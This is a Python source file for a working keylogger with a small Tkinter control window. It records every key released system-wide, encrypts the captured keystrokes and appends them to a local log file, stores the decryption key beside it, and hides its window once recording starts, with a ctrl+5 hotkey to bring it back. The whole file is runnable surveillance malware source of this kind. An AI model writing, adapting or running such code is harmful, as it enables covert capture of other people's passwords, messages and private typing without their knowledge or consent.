import keyboard
import threading
import os
from threading import Timer
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

sendReportEvery = 10

# creating random encryption key
key = Fernet.generate_key()
fernet = Fernet(key)


class Keylogger:
    # initializes variables
    def __init__(self, interval, reportMethod="file"):
        # passing sendReportEvery to interval
        self.interval = interval
        self.reportMethod = reportMethod
        # empty string for the message to be written in
        self.log = ""
        # file name is keylog.txt
        self.fileName = "keylog.txt"

    # reportFile method creates a log file in the current directory that contains keylogs in the self.log variable
    def reportFile(self):
        # appends keylogs as binary into keylog.txt
        with open(f"{self.fileName}", "ab") as f:
            # stores it in log_binary
            log_binary = str.encode(self.log)
            # encrypts using fernet
            encrypted = fernet.encrypt(log_binary)
            # looks at length of the encrypted string
            size = len(encrypted)
            # reads it in 4 bytes at once 
            f.write(size.to_bytes(4, "big"))
            f.write(encrypted)
        print(f"[+] Saved {self.fileName}")

    # decryptFile method that decrypts the string in encrypted list
    def decryptFile(self):
        decryptedMsgs = []
        encrypted = []
        # reads the keylog.txt file in binary
        with open(f"{self.fileName}", 'rb') as encFile:
            encrypted = encFile.read()

        # looks at file using os.stat to find out the size of it
        fileSize = os.stat(self.fileName).st_size

        # if fileSize is bigger than 4
        if fileSize > 4:
            # initialize the value
            bytesRead = 0
            # then while bytesRead is < than fileSize, read the file every 4 bytes
            while bytesRead < fileSize:
                # reads the first 4 bytes 
                size_binary = encrypted[bytesRead:bytesRead + 4]
                # adds to bytesRead variable
                bytesRead = bytesRead + 4
                # size of the next encrypted msg is taken from size_binary using int.from_bytes
                size = int.from_bytes(size_binary, "big")
                # passed on to this variable 
                nextEncrypted = encrypted[bytesRead:bytesRead + size]
                if not nextEncrypted:
                    break
                bytesRead = bytesRead + size
                decrypted = fernet.decrypt(nextEncrypted)
                decryptedMsgs.append(decrypted.decode("ascii") + "\n")
        with open(f"{self.fileName}_decrypted", "a") as decFile:
            decFile.writelines(decryptedMsgs)

    # records key inputs whenever key is released / on_release() method
    # function that replaces keys pressed with words
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    # gets called every 10 sec
    def report(self):
        if self.log:
            if self.reportMethod == "file":
                self.reportFile()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    # method that calls on the on_release() method
    def start(self):
        # starting keylogger
        keyboard.on_release(callback=self.callback)
        self.report()
        print("Started recording keystrokes")

    # stop method that saves the file and then decrypts the encrypted file
    def stop(self):
        print("Saving log file and exiting program...")
        if self.reportMethod == "file":
            self.reportFile()
            self.decryptFile()

# class that holds the GUI
class KeyloggerGUI:
    
    # constructor
    def __init__(self):
        # instance of class keylogger
        self.keylogger = Keylogger(interval=sendReportEvery, reportMethod="file")
        # creates tkinter window 
        self.window = tk.Tk()
        # title is Keylogger
        self.window.title("Keylogger")
        # makes a start button within the window and calls to start the keylogger
        self.start_button = tk.Button(self.window, text="Start", command=self.startKeylogger)
        self.start_button.pack(pady=10)
        # makes a stop button that calls on stopKeylogger and disables the stop button so that you  can't press it before starting
        self.stop_button = tk.Button(self.window, text="Stop", command=self.stopKeylogger, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        # hotkey to show the window again 
        self.hotkey_combination = "ctrl+5"  # Define the hotkey combination

        # hotkey pressed to show the GUI window and calls on showWindow method
        keyboard.add_hotkey(self.hotkey_combination, self.showWindow)

    # method that shows the window after hotkey is pressed
    def showWindow(self):
        # method to restore the window 
        self.window.deiconify()

    # method that starts the keylogger
    def startKeylogger(self):
        self.keylogger.start()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        # hides the GUI
        self.window.withdraw()
        # message box 
        messagebox.showinfo("Keylogger", "Started recording keystrokes")

    def stopKeylogger(self):
        # stops keylogger
        self.keylogger.stop()
        # lets you to click on start button 
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        # show the GUI window
        self.window.deiconify()  
        messagebox.showinfo("Keylogger", "Keylogger stopped. Log file saved.")

    # run method allows Tkinter to start event loop
    def run(self):
        self.window.mainloop()


if __name__ == "__main__":
    # makes key before starting the keylogger
    with open("key.key", "wb") as file:
        file.write(key)
    gui = KeyloggerGUI()
    gui.run()